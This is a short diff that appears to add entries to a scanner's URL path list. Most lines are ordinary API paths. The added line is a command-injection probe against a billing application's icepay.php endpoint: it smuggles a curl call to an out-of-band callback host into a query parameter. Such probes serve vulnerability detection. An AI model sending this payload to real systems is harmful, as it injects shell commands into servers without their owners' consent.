@@ -143,3 +143,4 @@
 /allversions
 /auth/v1/account/login_options
 /auth/v1/account/status
+/mbilling/lib/icepay/icepay.php?democ={{randstr}};curl%20{{interactsh-url}};%23
